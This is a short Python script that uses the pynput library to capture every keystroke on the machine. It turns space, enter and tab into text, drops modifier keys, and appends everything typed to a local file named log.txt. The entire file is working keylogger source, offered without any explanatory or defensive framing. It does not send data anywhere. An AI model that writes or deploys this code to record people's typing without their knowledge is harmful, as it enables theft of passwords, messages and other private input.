from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key).replace("'", "")

    if letter == "Key.space":
        letter = " "
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.shift_r" or letter == "Key.shift":
        letter = ""
    elif letter == "Key.ctrl_l" or letter == "Key.ctrl_r":
        letter = ""
    elif letter == "Key.alt_l" or letter == "Key.alt_r":
        letter = ""
    elif letter == "Key.tab":
        letter = "    "
    
    with open("log.txt", "a") as f:
        f.write(letter)

with Listener(on_press=write_to_file) as listener:
    listener.join()
